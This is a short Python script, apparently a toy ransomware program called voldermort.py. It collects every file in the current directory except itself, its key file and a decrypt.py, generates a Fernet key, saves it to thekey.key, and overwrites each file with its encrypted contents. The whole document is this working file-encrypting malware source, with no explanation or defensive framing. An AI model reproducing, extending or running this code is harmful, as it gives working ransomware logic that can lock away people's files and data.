#!usr/bin/env python3

import os
from cryptography.fernet import Fernet

#let's find some files


files=[]

for file in os.listdir():
	if file == "voldermort.py" or file=="thekey.key" or file=="decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)

key = Fernet.generate_key()

#print(key)

with open("thekey.key","wb") as thekey:
	thekey.write(key)

for file in files:
	with open(file,"rb") as thefile:
		content= thefile.read()
	content_encypted= Fernet(key).encrypt(content)
	with open(file,"wb") as thefile:
		thefile.write(content_encypted)
		
